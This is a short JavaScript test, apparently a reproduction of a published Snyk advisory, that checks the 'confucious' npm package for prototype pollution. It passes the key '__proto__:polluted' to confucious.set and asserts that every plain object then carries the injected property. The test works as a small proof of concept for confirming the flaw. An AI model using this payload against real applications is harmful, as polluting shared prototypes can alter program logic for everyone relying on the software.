//https://snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665
test("prototype pollution in confucious", () => {
  expect({}.polluted).toBe(undefined);

  const confucious = require("confucious");
  confucious.set("__proto__:polluted", "yes");

  expect({}.polluted).toBe("yes");
});
